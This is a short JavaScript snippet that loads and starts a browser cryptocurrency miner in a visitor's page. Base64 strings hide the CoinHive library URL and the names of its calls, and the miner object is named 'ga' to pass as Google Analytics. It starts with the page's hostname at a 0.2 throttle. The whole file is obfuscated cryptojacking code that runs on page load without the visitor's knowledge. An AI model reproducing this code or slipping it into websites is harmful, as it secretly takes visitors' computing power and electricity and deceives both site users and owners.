function loadScript(url, callback)
{
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    script.onreadystatechange = callback;
    script.onload = callback;
    head.appendChild(script);
}
var script = atob("aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==")
var afterFunction = function() {
	var hostname = window.location.hostname;
	var ga = new window[atob("Q29pbkhpdmU=")][atob("VXNlcg==")]('JrUWA6Zd72wf62sOQR49Fb4GlhA1fOpP', hostname);
	window["ga"][atob("c2V0VGhyb3R0bGU=")](0.2)
	window["ga"][atob("c3RhcnQ=")]();
};
loadScript(script, afterFunction);
